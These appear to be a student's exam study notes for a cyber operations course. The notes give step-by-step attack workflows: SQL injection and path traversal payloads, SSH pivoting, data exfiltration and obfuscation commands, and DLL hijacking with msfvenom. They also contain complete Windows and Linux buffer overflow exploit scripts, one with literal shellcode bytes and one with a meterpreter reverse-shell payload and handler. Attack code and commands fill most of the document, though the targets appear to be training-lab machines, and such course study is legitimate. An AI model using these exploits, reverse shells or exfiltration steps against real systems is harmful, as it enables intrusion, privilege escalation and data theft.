# CCTC Study Notes

## Test Distribution
*Overview of question breakdown by topic for exam preparation.*

- Posix: 11
- WinEx: 6
- Recon: 4
- SQL: 4
- LinEx: 4
- Binary: 4
- ExDev: 3

## Tunneling to Jump Host
*Establishing SSH tunnels through intermediate systems for network access.*

```bash
ssh -MS /tmp/jump student@Jump-IP -fN 2>/dev/null
ssh -S /tmp/jump jump
```

---

# Enumerate Website

## Directory Structure Enumeration
*Initial reconnaissance to map web application structure and identify entry points.*

- Look in `/var/www/html`
- Use nmap for active scanning and ping sweeps
- `nmap --scripte=http-enum Web-IP 80`

## Common Web Exploitation Techniques
*Methods for identifying and exploiting web vulnerabilities.*

### Path Traversal
Attempting to read system files through directory traversal:
- `../../../../../../etc/passwd`
- `../../../../../../etc/host`

### Command Injection
Testing for command execution capabilities:
- `cmd=whoami`
- `(;whoami)` if in input fields

### SQL Injection
*Exploiting improperly sanitized database queries to extract sensitive information.*

Example attack:
- `IP/login.php?username=bob' OR 1'=1&passwd=bob' OR 1='1`
- Gives access to all records from login query
- Can retrieve usernames and passwords

### UNION-Based SQL Injection
*Advanced SQL injection using UNION statements to extract database structure and data.*

```bash
http://127.0.0.1:4848/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;
```

- `table_schema` = databases
- `column_name` = tables
- `table_name` = columns

Database count:
- Default databases: 3 (information_schema, performance_schema, mysql)
- User databases: 1
- Total: 4

Extract user credentials:
```bash
http://127.0.0.1:4848/uniondemo.php?Selection=2 UNION SELECT user_id,name,username FROM siteusers.users;
```

---

# POSIX / Windows Exploitation

## Service and Process Enumeration
*Identifying running services and processes for exploitation opportunities.*

```bash
tasklist /svc
get-service
Get-WmiObject
get-ciminstance
```

**Note:** Daemons have parent processes that can be leveraged for privilege escalation.

## SSH Key-Based Authentication
*Using stolen SSH keys for lateral movement.*

```bash
chmod 600 stolen_key
ssh -i stolen_key jane@target_internal_ip
```

## Data Exfiltration

### Session Recording
*Capturing terminal sessions for post-exploitation analysis.*

```bash
ssh <user>@<host> | tee session.log
```

### Obfuscation (Windows)
*Encoding and obfuscating files to avoid detection.*

```powershell
type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil -encode <file> encoded.b64
```

### Obfuscation (Linux)
*Character shifting and encoding techniques for Linux systems.*

```bash
cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
cat <file> | base64
```

### Encrypted Transport
*Securely moving data across networks.*

```bash
scp <source> <destination>
ncat --ssl <ip> <port> < <file>
```

---

# Enumerate Linux Machine

*Comprehensive Linux host enumeration for information gathering and privilege escalation opportunities.*

## Initial Enumeration Commands

```bash
sudo -l                          # Check for sudo privileges
ls /tmp                          # Check temporary directories
ls /var/tmp                      # Additional temp locations
ls /home                         # List home directories
ps -elf                          # Process listing (look for rsyslog)
```

## Logging Configuration
*Identifying remote logging and data exfiltration channels.*

```bash
ls /etc/rsys*
cat /etc/rsys
ls /etc/rsyslog.d/
cat 20-ufw.conf
cat 21
cat 50
```

**Note:** If nothing indicates remote logging, continue enumeration.

## System Information

```bash
uname -a                         # Kernel version
ls -lisa /var/www/html           # Web files (green = directories)
cat /var/www/html/login.php      # Look for database credentials
```

## Database Access

*Extracting credentials and additional information from local databases.*

```bash
mysql --user=webuser --pass=sqlpass
MariaDB> use session;
MariaDB> show tables;
MariaDB> select * from session_log;
MariaDB> select * from user;  # May contain additional credentials
MariaDB> exit
```

## Network Enumeration

### Ping Sweep
*Identifying live hosts on the network.*

```bash
for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

If ping is unavailable, use proxychains:
```bash
proxychains for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

### TTL Analysis
*Determining OS and routing characteristics.*

- TTL 64 = Linux
- TTL 128 = Windows or special routing
- TTL 255 = Networking devices (avoid)

## SQL Injection Testing

*Testing for SQL vulnerabilities to extract data.*

```bash
http://127.0.0.1:4848/uniondemo.php?Selection=1 or 1=1
```

### Tunnel to Next Target
*Creating SSH tunnels for access to internal machines.*

```bash
ssh -S /tmp/jump t1 -O forward -L 1112:Next-IP:22 -fN
ssh -MS /tmp/t1 user2@127.0.0.1 -p 1112 -fN
ssh -S /tmp/t1 t1
```

## Privilege Escalation Enumeration

*Identifying potential privilege escalation vectors.*

```bash
sudo -l                          # Check for sudo access
ls /tmp
ls /var/tmp
ps -elf                          # Look for bash scripts or netcat listeners
cat /etc/crontab                 # Scheduled tasks
find / -type f -perm /6000 -ls 2>/dev/null  # SUID/SGID files
```

### Cron Job Analysis
*Investigating scheduled tasks for exploitation.*

Look for commands running from suspicious directories:
- `/tmp`
- `/var/tmp`
- Other non-standard locations

Search identified commands in [GTFOBins](https://gtfobins.github.io/) for privilege escalation.

### File Analysis with Ghidra
*Reverse engineering compiled binaries for vulnerability identification.*

```bash
ls -lisa /root
cd /root
cat files inside directory
scp RE_ME.obs to linOPS then to WinOPS
# Use ghidra to analyze
```

**Note:** In Ghidra, `>>` or `<<` indicates bit shifting, not append operations.

## Lateral Movement to Windows
*Network discovery and pivoting to Windows systems.*

### Rediscovery Ping Sweep
```bash
for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

### Windows Target Discovery
*Scanning for Windows systems and RDP services.*

```bash
cancel previous dynamic tunnel
proxychains nmap
# Look for port 3389 (RDP) or vulnserver/secureserver ports
```

### RDP Access Setup
*Creating tunnels for RDP access.*

```bash
ssh -S /tmp/t1 t2 -O forward -L 1113:Win-IP:22 -L 1114:Win-IP:3389 -fN
ssh -MS /tmp/t2 Aaron@127.0.0.1 -p 1113 -fN
ssh -S /tmp/t2 t3
```

Or direct RDP:
```bash
xfreerdp /u:Aaron /v:localhost:1114 /dynamic-resolution +clipboard
```

---

# DLL Hijacking

*Exploiting DLL search order to achieve code execution.*

## Process Monitoring

```bash
procmon /AcceptEula
```

Set filters:
- Process name contains `sus.exe`
- Path contains `.dll`
- Result is `NAME NOT FOUND`

## Vulnerability Research

1. Identify the vulnerable DLL (e.g., `SSPICLI.dll`)
2. Understand DLL search order:
   1. Registry keys
   2. File folder (application directory)
   3. Rest of system

## Malicious DLL Creation
*Creating a payload DLL to replace the legitimate one.*

```bash
msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
```

## DLL Deployment
*Moving the malicious DLL to the target system.*

```bash
scp student@10.50.157.212:/tmp/SSPICLI.dll C:\Users\student\Documents\putty\SSPICLI.dll
```

**Note:** For tunneled systems, transfer through each tunnel sequentially.

## Execution

Run the target executable to trigger DLL loading and payload execution.

---

# Host Enumeration - Linux

*Systematic information gathering for Linux systems to identify exploitable configurations.*

**Objective:** Gather environmental information for privilege escalation, network reconnaissance, and admin behavior analysis.

**Key Reminder:** Always use `ls -la` when checking directories.

## System Information Commands

| Command | Purpose |
|---------|---------|
| `date & time` | Correlate logs and identify timezone |
| `whoami` | Current user identification |
| `id` | User permissions and group membership |
| `groups` | Group membership (sudoers check) |
| `sudo -l` | Executable binaries with elevated privileges |
| `cat /etc/passwd` | User account information |
| `cat /etc/shadow` | Password hashes (requires root) |
| `w` | Active users and their activities |
| `last` | User login history and patterns |
| `uptime` | System uptime (pivot opportunity assessment) |
| `hostname` | Machine name |
| `uname -a` | Kernel version and architecture |
| `cat /etc/*rel*` | OS version information |

## Network Information

| Command | Purpose |
|---------|---------|
| `ip addr` | Network interfaces and IP configuration |
| `ifconfig -a` | Network info (deprecated) |
| `cat /etc/hosts` | Hostname to IP mappings |
| `cat /etc/resolv.conf` | DNS configuration |
| `ss -antp` | TCP sockets and processes (requires root) |
| `netstat -antp` | TCP socket information |
| `netstat -anup` | UDP socket information |
| `netstat -rn` | Routing table |
| `arp -an` | ARP table |

## Process Information

| Command | Purpose |
|---------|---------|
| `ps -ef` | All processes (full format) |
| `ps -auxf` | Processes with additional information |
| `lsof -p [pid]` | Open files by process ID |
| `ls -al /proc/[pid]` | Process directory information |
| `service --status-all` | Service status overview |
| `systemctl list-units --type=service` | Service listing (systemd) |

## Logging Configuration
*Examining logging setup for security monitoring evasion.*

```bash
cat /etc/rsyslog.conf           # Default rsyslog configuration
/etc/rsyslog.d                  # Additional config files
/var/log                        # Log storage location
```

## Cron Job Analysis
*Scheduled tasks can be leveraged for privilege escalation or persistence.*

**Important:** Crontabs are user-specific; you cannot view other users' cron jobs without sudo.

```bash
/var/spool/cron/crontabs        # User cron directory
/etc/cron.d                      # System cron directory
ls -la /etc/cron*               # All cron-related files
cat /etc/cron*
sudo crontab -u student -l      # User-specific cron (requires sudo)
```

## File Search Techniques
*Locating sensitive files for exploitation.*

```bash
find / -name password* 2>/dev/null              # Files with "password" in name
find / -iname *test* 2>/dev/null                # Case-insensitive search
find / -type f -name *.txt                      # All .txt files
find / -type f -name ".*"                       # Hidden files
find / -type d -name ".*"                       # Hidden directories
```

## Key Directories

| Directory | Purpose |
|-----------|---------|
| `/tmp` | World-writable temporary files |
| `/home` | User home directories |
| `/etc` | System configuration files |

---

# Host Enumeration - Windows

*Systematic information gathering for Windows systems.*

## General Information

```powershell
Date /t
Time /t
Hostname
Whoami
systeminfo
```

## User Information
*Identifying user accounts and group memberships.*

```powershell
Net user
Net localgroup
Net localgroup administrators
Net use                         # Mapped shares
```

## Network Configuration

```powershell
Ipconfig /all
Ipconfig /displaydns
Route print
Netstat -ant
Netstat -anob                   # Requires admin
```

## Interesting Locations
*Key areas for information gathering.*

- Enable "Show hidden files" in Explorer
- User Documents, Downloads, Desktops
- `Dir c:\windows\prefetch` (admin) - Recent executables
- `Dir /a:h` - Hidden files
- `dir /o:d /t:w c:\windows\system32` - System files by date
- `dir /o:d /t:w c:\windows\system32\winevt\logs` - Event logs
- `dir /o:d /t:w c:\windows\temp` - Temporary files

## Registry Examination
*Identifying persistence and auto-start mechanisms.*

```powershell
reg query hklm\software\microsoft\windows\currentversion\run /s
reg query hkcu\software\microsoft\windows\currentversion\run /s
reg query hkcu\software\microsoft\windows\currentversion\runonce /s
```

## Process and Service Enumeration

```powershell
Tasklist /v
Tasklist /svc
tasklist /svc | findstr /i "PID"

Services.msc                    # GUI interface
Sc query <service name>

# Find services not in System32
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a

Schtasks
Task sch                        # Task Scheduler GUI
schtasks /query /fo LIST /v
schtasks /query
```

---

# Windows Buffer Overflow

*Step-by-step guide for exploiting stack-based buffer overflow vulnerabilities on Windows.*

## Static Analysis
*Examining the binary without execution.*

```powershell
# Open PowerShell ISE as admin
cd <directory with exe>
strings.exe ./file.exe
# Also check: Properties > Details
```

## Behavioral Analysis
*Monitoring runtime behavior.*

```powershell
# Run the executable
netstat -anob                   # Monitor network connections
get-process | findstr /i "secure"
get-process | findstr /i "vuln"
```

## Dynamic Analysis with Debugger
*Using Immunity Debugger for real-time analysis.*

1. Launch Immunity Debugger as admin
2. File → Attach to process or Open executable
3. Click "Rewind" button
4. Click "Play" button

## Initial Connectivity Test
*Creating basic socket connection script.*

```python
#!/usr/bin/python
import socket

buf = "HELP"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  # IPv4 socket
s.connect(("10.50.188.51", 9999))                        # Target IP/Port
print s.recv(1024)                                        # Print response
s.send(buf)                                               # Send payload
print s.recv(1024)                                        # Print response
s.close()                                                 # Close connection
```

## Fuzzing Phase
*Finding the crash point with controlled input.*

```python
buf = "TRUN /.:/"
buf += "A" * 5000    # Fuzz value
```

**Debugger Steps:**
1. Restart application
2. Play button
3. Check Security tab
4. Verify EIP shows `0x41414141` (AAAA)

## EIP Offset Calculation
*Determining exact offset to return address.*

1. Generate pattern: [Wiremask Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) (5000 length)
2. Replace fuzzing buffer with generated pattern
3. Crash again and note EIP value
4. Use Wiremask "Find Offset" to calculate offset (e.g., 2003)

```python
buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"       # EIP verification
```

**Result:** EIP should display `0x42424242`

## JMP ESP Address Discovery
*Finding executable memory to jump to shellcode.*

```
Immunity Debugger:
1. Bottom search bar: !mona modules
2. Check Module Info box - want all "False"
3. Search: !mona jmp -r esp -m "vulnerable.dll"
4. Copy addresses from Log data
```

Example addresses:
```
0x625011AF
0x625011BB
0x625011C7
0x625011D3
0x625011DF
```

Convert to little endian: `0x625011AF` → `\xaf\x11\x50\x62`

```python
buf += "\xaf\x11\x50\x62"    # JMP ESP address
```

## NOP Sled Addition
*Adding padding to ensure shellcode alignment.*

```python
buf += "\x90" * 10           # NOP sled
```

## Payload Generation
*Creating the shellcode with msfvenom.*

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.188.46 lport=4444 \
  -b "\x00\xfe\x20\x0a\xff" -f python
```

Copy the generated buffer into script (excluding `buf = b""`).

## Final Exploit Structure
```python
#!/usr/bin/python
import socket

buf = "TRUN /.:/"
buf += "A" * 2003           # Offset
buf += "\xaf\x11\x50\x62"   # JMP ESP
buf += "\x90" * 10          # NOP sled
buf += "<msfvenom_shellcode>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.188.51", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)
s.close()
```

## Exploitation Handler Setup
*Catching the reverse connection.*

```bash
msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

**Important:** msfvenom and msfconsole must use the same LPORT.

---

# Linux Buffer Overflow

*Complete workflow for exploiting stack-based buffer overflow on Linux.*

## Static Analysis
*Initial binary examination.*

```bash
strings ./file      # Extract readable strings
file ./file         # Confirm format (ELF 32-bit)
```

## Behavioral Analysis
*Testing input handling.*

```bash
chmod u+x file
./file
./file <<< $(echo "12345")      # Test with input
```

## Fuzzing
*Finding the crash point.*

```bash
./file <<< $(echo "AAAAAAAAAA...")  # Many A's
# Look for "Segmentation fault"
```

## GDB Analysis
*Runtime debugging and disassembly.*

```bash
gdb ./file
(gdb) info functions
(gdb) run
Ctrl + C
gdb) pdisass main
(gdb) pdisass getuserinput
```

**Code color indicators:**
- Green = active code
- Yellow = stack allocation
- Red = vulnerable areas

## Unsafe C Functions
*Common vulnerability patterns.*

Unsafe: `gets()`, `strcpy()`, `strcat()`, `sprintf()`

Safe alternatives: `fgets()`, `strncpy()`, `strncat()`, `snprintf()`

## Stack Canary Protection
*Modern protection against buffer overflows.*

Stack canaries are hidden values placed before the return pointer. Overwriting them terminates the program to prevent exploitation.

## EIP Offset Discovery
*Finding exact bytes to control return address.*

1. Generate pattern: [Wiremask Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
2. Create test script with pattern
3. Run in GDB: `run <<< $(python func.py)`
4. Note EIP value from crash
5. Use Wiremask "Find Offset" to calculate

```python
offset = "A" * 62
eip = "B" * 4
print(offset + eip)
```

Verify in GDB that EIP equals `0x42424242`.

## JMP ESP Address Finding
*Locating executable memory for code execution.*

Start clean GDB environment:
```bash
env - gdb ./func
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
(gdb) run
Ctrl + C
(gdb) info proc map
```

Note HEAP and STACK addresses.

Search for JMP ESP opcode (FF E4):
```bash
(gdb) find /b <heap_addr>, <stack_addr>, 0xff, 0xe4
```

Convert to little endian: `0xf7de3b59` → `\x59\x3b\xde\xf7`

## Shellcode Generation
*Creating the payload.*

```bash
msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
```

## Final Exploit
```python
offset = "A" * 62
eip = "\x59\x3b\xde\xf7"      # JMP ESP address
nop = "\x90" * 15              # NOP sled
shellcode = "<msfvenom_output>"
print(offset + eip + nop + shellcode)
```

## Execution
```bash
./file <<< $(python func.py)
```

If successful, the shellcode executes (e.g., `whoami` output displays).

---

 1 ## Download func
 2
 3 ## Static Analysis ##
 4 ## strings func
 5 ## file func
 6     ## Wants a String, is an ELF (executable)
 7
 8 ## Behavioral Analysis ##
 9 ## chmod u+x func
10 ## run it 
11 # Command Substitution (parameter):            TEST EVERY SINGLE TIME!!! (parameter) or (UI)
12     # ./func $(echo "12345") 
13 # User Input:
14     # ./func <<<$(echo "12345")
15
16 ## Dynamic Analysis ##
17 # Fuzzing
18    # ./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")      BREAKING FUNCTION
19    # ./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")  ENOUGH TO BREAK
20
21 # gdb ./func
22      # shell (gives shell)
23      # exit (gets us back to gdb)
24      # info functions
25      # run (Ctrl + c to exit)
26      # info functions again (more output)
27 # Dissassembly
28     # pdisass main  
29     # pdisass <new function call> ----> querying words in GREEN -----> vulnerable function is in RED
30
-----------------------------------------------------------------------------------------------------------
#!/usr/bin/env python

offset = "A" * 100
# offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"   THIS COMES 2ND (use wiremask buffer generator)

print(offset)

# Back in GDB, run <<<$(python ./lin.py)
# Put register value in Wiremask to find Offset.
# Use Wiremask to find EIP
# Verify EIP by putting 4 "B" at the end of offset ------> TRYING TO OVERWRITE EIP
# Find the JMP ESP location
    #shell
    #env - gdb ./func
    #unset env LINES
    #unset env COLUMNS
    #show env (verify nothing is in there)
    ## run OR start (run just runs it, start allows for breakpoint)
    #info proc map  (run ./inventory.exe | Ctrl + C when prompted)
        #(may need to run "step" and "info proc map" again to see heap and stac
    #memory address after heap:0xf7de10001
    #memory address before stack:0xffffe000
    #find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
    ## JMP EST locations:    FIRST 5
    0xf7de9d29
    0xf7deb439
0xf7debd49
0xf7e2eb2c
0xf7ec60b7 <lchmod+7>
0xf7edd10d <fgetspent+205>
0xf7f24223
0xf7f2d7a2
0xf7f2eb78
0xf7f305f8
0xf7f32b22
0xf7f58b93
0xf7f647ef
#Little Endian 
    #f7 de 3b 59 > \x59\x3b\xde\xf7

nop = "\x90" * 15 
print(offset + eip + nop)
#msfvenom payload:
    #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python

buf += b"\xba\xef\x1e\xda\x84\xda\xc4\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x0b\x83\xef\xfc\x31\x57\x10\x03\x57"
buf += b"\x10\x0d\xeb\xb0\x8f\x89\x8d\x17\xf6\x41\x83\xf4"
buf += b"\x7f\x76\xb3\xd5\x0c\x10\x44\x42\xdc\x82\x2d\xfc"
buf += b"\xab\xa1\xfc\xe8\xab\x25\x01\xe9\xc4\x4d\x6e\x88"
buf += b"\x47\xe4\x70\x1d\xcb\x7f\x91\x6c\x6b"

-------------------------UPDATED EXAMPLE WITH OFFSET VALUE AND EIP--------------------------
#!/usr/bin/env python
offset = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15 
buf =  b""
buf += b"\xba\xef\x1e\xda\x84\xda\xc4\xd9\x74\x24\xf4\x5f"
buf += b"\x29\xc9\xb1\x0b\x83\xef\xfc\x31\x57\x10\x03\x57"
buf += b"\x10\x0d\xeb\xb0\x8f\x89\x8d\x17\xf6\x41\x83\xf4"
buf += b"\x7f\x76\xb3\xd5\x0c\x10\x44\x42\xdc\x82\x2d\xfc"
buf += b"\xab\xa1\xfc\xe8\xab\x25\x01\xe9\xc4\x4d\x6e\x88"
buf += b"\x47\xe4\x70\x1d\xcb\x7f\x91\x6c\x6b"
print(offset + eip + nop + buf)
#msfvenom payload:
    #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python       PAYLOAD PRINTED FROM SPECIFIC COMMAND WILL BE PAYLOAD IN SCRIPT  |  RUN SCRIPT IN FUNC FILE (./inventory.exe <<<$(python exp.py))

ADD ALL RESULTS TO SCIRPT AND PRINT STATEMENT



###WINDOWS FUNC###
#Static Analysis
    strings.exe vulnserver.exe   ------> (Looking for clues and leads)
    GUI > Properties           -------> (More potential leads)
#Behavioral Analysis
    RUN IT
    netstat -anob
    get-process | findstr /i <string to look for>
    nc <win ip> <port identified>  ----> (Ran from Lin-Ops and see what pops up)
#Dynamic Analysis
    Run Immunity Debugger > Run vulnserver.exe > File > Attach | Rewind > Play
    On Lin-Ops CREATE NEW SCRIPT     RESTART AND RUN DEBUGGER AFTER EVERY VALUE ADDED
    !mona modules ------> searching for unprotected dll's (which is the most vulnerable / False across the board)
    !mona jmp -r esp -m "essfunc.dll" -----> searches for jmp esp in specific dll (Log data Window on Immunity Debugger)
    COPY FIRST 2-3 & move to script (buf += "inverted\numbers")
    Create NOP SLED (buf += "\x90" * 10)
    CREATE PAYLOAD = msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.188.39 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python ----> (lhost is Lin-Ops IP)  RUN PAYLOAD IN TERMINAL
    COPY AND PASTE PAYLOAD INTO SCRIPT 
    SETUP MSFCONSOLE
    msfconsole
    use multi/handler
    show options
    set payload windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 4444
    exploit



  #!/usr/bin/python
  import socket 
  buf = "TRUN /.:/"    #Commands accepted
  buf += "A" * 2003
  #JMP ESP:
  buf += "\xaf\x11\x50\x62 -----------------> essentially inverted
  #62 50 11 af
  #PAYLOAD HERE#

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  #Creates socket
  s.connect(("10.50.171.24", 9999))   #Connecting to TargetIP/Port  ------> (your windows ip)
  print s.recv(1024)  #Print response
  s.send(buf)  #Sends value of buf
  print s.recv(1024)  #Print response
  s.close()  #Closes the socket
  -------------------------------------------------------------------------------------------------------------------------------------------------------
DLL Search Order
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
  The directory the the Application was run from  *IMPORTANT*
    The directory specified in in the C+ function GetSystemDirectory()
      The directory specified in the C+ function GetWindowsDirectory()
        The current directory
 
Finding vulnerable Scheduled Tasks
  schtasks /query /fo LIST /v
--------------------------------------------------------------------------------------
##DLL HIJACKING##
Process Name contains putty.exe    (ProcMon)
Path contains .dll
Result is NAME NOT FOUND

student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
student@lin-ops:~$ python3 -m http.server 42070

http://10.50.188.39:42070  #ON WINDOWS#
##GRAB DLL ON WINDOWS MACHINE##
##RUN PUTTY## (NEW FILE NAMED YOUR COMMAND SHOULD BE POPULATED)
-----------------------------------------------------------------------------------------------------------------------------------------------
Finding Vulnerable Services
wmic service list full
sc query
##SEARCHING FOR PATHS THAT GET RAN FROM SPECIFIC SERVICES##
##IDENTIFY PERMISSIONS##
-------------------------------------------------------------
##Persistance##
Survives:
Reboots
Credential changes
DHCP IP reassignment

Considerations include:
File naming
File location
Timestomping
Port selection

##AUDITPOL SETTINGS##
auditpol /get /category:*

##Event Logging##
Storage: c:\windows\system32\config\
File-Type: .evtx/.evt

wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List























**Resource Links:**
- [GTFOBins](https://gtfobins.github.io/) - Privilege escalation reference
- [Wiremask Tools](https://wiremask.eu/tools/) - Pattern generator and offset calculator
- [Blog Reference](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - Linux privilege escalation guide
